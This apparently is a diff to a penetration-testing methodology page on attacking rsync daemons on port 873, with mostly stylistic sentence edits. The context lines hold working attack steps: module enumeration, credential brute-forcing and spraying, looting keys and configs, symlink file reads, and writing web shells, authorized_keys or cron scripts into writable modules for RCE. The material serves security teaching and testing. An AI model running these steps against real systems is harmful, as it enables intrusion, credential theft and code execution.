@@ -1,9 +1,9 @@
 ---
 title: Rsync - Port 873
-description: Enumeration and attack methodology for the rsync daemon on port 873, covering module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging.
+description: "Enumerate and attack the rsync daemon on port 873. Cover module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging."
 openGraph:
   title: "Rsync - Port 873"
-  description: "Enumeration and attack methodology for the rsync daemon on port 873, covering module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging."
+  description: "Enumerate and attack the rsync daemon on port 873. Cover module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging."
   images:
     - url: /imgs/rsync.jpg
       width: 1672
@@ -13,7 +13,7 @@ openGraph:
 twitter:
   card: summary_large_image
   title: "Rsync - Port 873"
-  description: "Enumeration and attack methodology for the rsync daemon on port 873, covering module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging."
+  description: "Enumerate and attack the rsync daemon on port 873. Cover module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging."
   images:
     - url: /imgs/rsync.jpg
       width: 1672
@@ -76,9 +76,9 @@ nc -nv <IP> 873   # then: @RSYNCD: 31.0  /  #list
 
 - [ ] `nmap -sV -sC -p873 <IP>` confirm rsyncd and capture the banner. The greeting includes the protocol version (e.g. `@RSYNCD: 31.0`).
 - [ ] `nmap --script rsync-list-modules -p873 <IP>` enumerates every advertised module name plus description. The single highest-value rsync recon command.
-- [ ] `rsync --list-only rsync://<IP>/` equivalent enumeration via the client. Run both; they occasionally disagree on filtered or non-default configs.
+- [ ] `rsync --list-only rsync://<IP>/` equivalent enumeration via the client. Run both. They occasionally disagree on filtered or non-default configs.
 - [ ] `nc -nv <IP> 873` then send `@RSYNCD: 31.0` and `#list` manual enumeration when rsync is not installed locally.
-- [ ] Read every module name/description carefully names like `backup`, `home`, `www`, `dev`, `etc`, `secret`, `keys` are intelligence in themselves, and each implies a different target.
+- [ ] Read every module name/description carefully. Names like `backup`, `home`, `www`, `dev`, `etc`, `secret`, and `keys` are intelligence in themselves, and each implies a different target.
 
 <Callout type="info">
 **Prioritise from the names.** If a listing returns `backup`, `www`, and `internal` but anonymous access works only on `www`, the other two carry an `auth users` directive. An open `www` is often a "sync the website" task the admin never tightened, while a name like `internal` or `secret` is exactly what admins use for content they do not want found  frequently worth far more than the open module. Queue the restricted, high-value names for credential attacks in Phase 3, not just the ones that open freely.
@@ -103,8 +103,8 @@ for m in backup public data files shared share home www web etc config srv mirro
 done
 ```
 
-- [ ] For every module: `rsync -av --list-only rsync://<IP>/<MODULE>/`. The trailing slash matters without it rsync lists *the module itself*; with it, the module is enumerated as a directory.
-- [ ] Interpret the response: success → loot it (Phase 4); `@ERROR: auth failed on module <NAME>` → credentials required, queue for Phase 3; `@ERROR: access denied ... from <YOUR_IP>` → `hosts allow`/`deny` filter, may be bypassable from a different pivot; `@ERROR: chroot failed` → misconfigured path, but the module's existence is confirmed.
+- [ ] For every module: `rsync -av --list-only rsync://<IP>/<MODULE>/`. The trailing slash matters without it rsync lists *the module itself*. With it, the module is enumerated as a directory.
+- [ ] Interpret the response: success → loot it (Phase 4). `@ERROR: auth failed on module <NAME>` → credentials required, queue for Phase 3. `@ERROR: access denied ... from <YOUR_IP>` → `hosts allow`/`deny` filter, may be bypassable from a different pivot. `@ERROR: chroot failed` → misconfigured path, but the module's existence is confirmed.
 - [ ] Try common modules blind even if unadvertised: `backup`, `public`, `data`, `files`, `shared`, `share`, `home`, `www`, `web`, `etc`, `config`, `srv`, `mirror`, `pub`.
 
 ### Phase 3: Credential Attacks
@@ -132,7 +132,7 @@ sudo tcpdump -nn -A -i <IFACE> 'tcp port 873'
 ```
 
 - [ ] Spray harvested credentials against any module that returned `auth failed` credential reuse is the highest-probability path. Use the shell loop above or a wordlist.
-- [ ] `nmap --script rsync-brute --script-args "rsync-brute.module=<MODULE>" -p873 <IP>` built-in brute force; faster and cleaner than a shell loop. `brute.firstonly=true` stops at the first hit.
+- [ ] `nmap --script rsync-brute --script-args "rsync-brute.module=<MODULE>" -p873 <IP>` built-in brute force. Faster and cleaner than a shell loop. `brute.firstonly=true` stops at the first hit.
 - [ ] Hydra also has an rsync module (`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rsync://<IP>/<MODULE>`) but it is brittle prefer the NSE script.
 - [ ] rsyncd authentication is an MD5-based challenge-response over cleartext. In a MITM position, capture the pair with `tcpdump` and crack it offline.
 
@@ -165,7 +165,7 @@ grep -riIE "password|passwd|secret|api[_-]?key|token|aws_access|database_url|con
 ```
 
 - [ ] List recursively first: `rsync -av --list-only rsync://<IP>/<MODULE>/`. Produces a full file tree with sizes/timestamps for the cost of a tiny transfer. Save it.
-- [ ] From the listing, pick high-value targets without downloading: SSH material (`id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.ppk`, `authorized_keys`, `known_hosts`); configs (`*.conf`, `*.env`, `*.yaml`, `wp-config.php`, `web.config`, `settings.py`); history (`.bash_history`, `.psql_history`, `.mysql_history`); scripts (`*.sh`, `*.ps1`, `*.py`); secret stores (`*.kdbx`, `password*`, `secret*`); backups (`*.bak`, `*.tar*`, `*.sql*`); VCS (`.git/config`, `.git-credentials`).
+- [ ] From the listing, pick high-value targets without downloading: SSH material (`id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.ppk`, `authorized_keys`, `known_hosts`). Configs (`*.conf`, `*.env`, `*.yaml`, `wp-config.php`, `web.config`, `settings.py`). History (`.bash_history`, `.psql_history`, `.mysql_history`). Scripts (`*.sh`, `*.ps1`, `*.py`). Secret stores (`*.kdbx`, `password*`, `secret*`). Backups (`*.bak`, `*.tar*`, `*.sql*`). VCS (`.git/config`, `.git-credentials`).
 - [ ] Pull only those paths with `--include`/`--exclude`, then `grep -riIE` the loot for credentials.
 
 <Callout type="warning">
@@ -199,9 +199,9 @@ rsync -av rsync://<IP>/<MODULE>/shadow_link ./
 ```
 
 - [ ] `rsync -av ./test.txt rsync://<IP>/<MODULE>/`  instant write success, or "permission denied / read only".
-- [ ] If writable, the value depends on what the path maps to: web root (`/var/www/html`, `/srv/http`) → upload web shell → RCE; user home (`/home/<user>`) → drop `.ssh/authorized_keys` → SSH as that user ssh; cron-watched dir (`/etc/cron.*`, `/var/spool/cron`) → script execution as the cron owner; service binary path (`/usr/local/bin`, `/opt/<app>/bin`) → replace a privileged binary.
+- [ ] If writable, the value depends on what the path maps to: web root (`/var/www/html`, `/srv/http`) → upload web shell → RCE. User home (`/home/<user>`) → drop `.ssh/authorized_keys` → SSH as that user ssh. Cron-watched dir (`/etc/cron.*`, `/var/spool/cron`) → script execution as the cron owner. Service binary path (`/usr/local/bin`, `/opt/<app>/bin`) → replace a privileged binary.
 - [ ] Module names rarely reveal the underlying path  verify with a canary upload before dropping a real payload.
-- [ ] If `use chroot = no`, plant a symlink to an out-of-module file and read it back  a full filesystem read primitive for any file the daemon UID can reach.
+- [ ] If `use chroot = no`, plant a symlink to an out-of-module file and read it back. That is a full filesystem read primitive for any file the daemon UID can reach.
 
 ### Phase 6: Pivot from Loot to Lateral Movement
 
@@ -224,7 +224,7 @@ chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>
 nmap -p873 --open <SUBNET>/24
 ```
 
-- [ ] Spray every credential extracted from rsync against SSH, SMB, WinRM, RDP, FTP, databases, and web admin panels credential reuse is the point of this phase.
+- [ ] Spray every credential extracted from rsync against SSH, SMB, WinRM, RDP, FTP, databases, and web admin panels. Credential reuse is the point of this phase.
 - [ ] Use any SSH key found: `chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>`, trying every discovered username, not just the directory it came from ssh.
 - [ ] `nmap -p873 --open <SUBNET>/24` where there is one open rsync there are usually more, with the same default config.
 - [ ] Database backups (`*.sql`, `*.sql.gz`, `*.bak`) often contain hashes to crack offline and credentials that work against the live database.
@@ -239,7 +239,7 @@ nmap -p873 --open <SUBNET>/24
     "Scan the rest of the subnet for additional rsync hosts before touching this one"
   ]}
   answer={0}
-  explanation="A writable rsync module mapped to a web root is instant RCE drop a one-line PHP web shell, browse to the corresponding URL, and execute as the web server user. Verify the mapping first with a quick canary upload (rsync -av canary.html rsync://<IP>/website/ then browse for it). Downloading first (B) is something you do eventually, but the WordPress version is irrelevant when you can run arbitrary code without exploiting any plugin. The .htaccess hijack (C) is clever but indirect RCE outranks credential capture. Scanning more hosts (D) is a delay tactic when a confirmed vulnerability is in front of you. Always cash in confirmed RCE before pursuing more recon."
+  explanation="A writable rsync module mapped to a web root is instant RCE. Drop a one-line PHP web shell, browse to the corresponding URL, and execute as the web server user. Verify the mapping first with a quick canary upload (rsync -av canary.html rsync://<IP>/website/ then browse for it). Downloading first (B) is something you do eventually, but the WordPress version is irrelevant when you can run arbitrary code without exploiting any plugin. The .htaccess hijack (C) is clever but indirect. RCE outranks credential capture. Scanning more hosts (D) is a delay tactic when a confirmed vulnerability is in front of you. Always cash in confirmed RCE before pursuing more recon."
 />
 
 ## Overview
@@ -249,7 +249,7 @@ Rsync is a fast, delta-encoding file-synchronization tool. It has two transport 
 | Mode | Port | Auth | Encryption | Notes |
 |------|------|------|------------|-------|
 | **rsyncd daemon** | 873/TCP | Per-module, MD5 challenge | None (cleartext) | The classic exposure what this note covers |
-| **rsync over SSH** | 22/TCP | SSH (key or password) | SSH session | Inherits SSH security; default for command-line transfers |
+| **rsync over SSH** | 22/TCP | SSH (key or password) | SSH session | Inherits SSH security. Default for command-line transfers |
 
 | Detail | Value |
 |--------|-------|
@@ -325,7 +325,7 @@ log file = /var/log/rsyncd.log
 
 ### `use chroot = no` Path Traversal
 
-With `use chroot = yes` (the default), rsyncd `chroot()`s into the module path and cannot serve files outside it. Set to `no`, the daemon runs in its parent's filesystem view and *symlinks within the module can point outside it*. Combined with anonymous access this is a full filesystem read primitive (see the symlink commands in Phase 5). Rare in modern Debian/Ubuntu installs (which default to `yes`) but common on appliances and NAS firmware where an admin disabled chroot to make a path work.
+With `use chroot = yes` (the default), rsyncd `chroot()`s into the module path and cannot serve files outside it. Set to `no`, the daemon runs in its parent's filesystem view. Then *symlinks within the module can point outside it*. Combined with anonymous access this is a full filesystem read primitive (see the symlink commands in Phase 5). This is rare in modern Debian/Ubuntu installs (which default to `yes`). It is common on appliances and NAS firmware where an admin disabled chroot to make a path work.
 
 ## NSE Scripts
 
@@ -344,7 +344,7 @@ nmap --script "rsync-*" -p873 <IP>
 
 ## Rsync as a File Transfer Tool (Post-Exploitation)
 
-Rsync over SSH is the most operationally pleasant Linux file-transfer tool: it compresses, resumes, preserves permissions/timestamps, and inherits SSH's encryption all without any extra service on the target beyond standard SSH.
+Rsync over SSH is an operationally pleasant Linux file-transfer tool. It compresses, resumes, preserves permissions/timestamps, and inherits SSH's encryption. It needs no extra service on the target beyond standard SSH.
 
 ```bash
 # Pull a directory tree from a compromised host to the attacker
